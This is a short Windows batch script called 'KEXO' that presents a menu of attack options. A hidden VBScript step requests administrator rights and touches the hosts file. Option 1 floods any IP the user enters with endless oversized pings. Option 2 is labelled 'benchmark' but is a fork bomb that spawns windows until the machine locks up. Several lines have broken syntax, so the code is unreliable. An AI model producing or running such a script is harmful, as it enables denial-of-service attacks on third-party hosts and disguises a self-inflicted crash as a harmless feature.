@echo off
title KEXO
color 5a
echo Set UAC = CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
set params = %*:"="
echo UAC.ShellExecute "cmd.exe","/c >> %WINDIR%\System32\drivers\etc\hosts","","runas", 0 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs" > NUL
echo -----------------------------------------------------------------------------------------
echo                                             Welcome to KEXO                                                 
echo -----------------------------------------------------------------------------------------
echo version 0.0.1
echo We added a few new functions!
echo 1.ddos machine
echo 2.benchmark
echo 3.sandbox
echo 4.exit
set /p select:=1,2,3,4:
if %select:%==1 goto attac
if %select:%==2 goto benchmark
if %select:%==3 goto sandbox
if %select:%==4 goto exit

:exit
exit


:sandbox
cls
title sandbox
color 1a
echo BLOCKED
echo to exit this window u have to close program
echo DONT CLICK ANY KEY BCS YOU GO TO BENCHMARK!!!
ping localhost -n 3  >nul
exit

	
:benchmark
cls
title benchmark
color 4a
echo NUCKED!
start start
goto benchmark


:attac
cls 
title DDOS ATTACK
color 7a
echo enter here ip
set /p "ipadress"
echo %ipadress% is this correct ip?
set /p correct?:=yes,no:
if %correct?:%==yes goto ddoslol
if %correct?:%==no goto attac

:ddoslol
ping %ipadress% -t -l 9500
goto ddoslol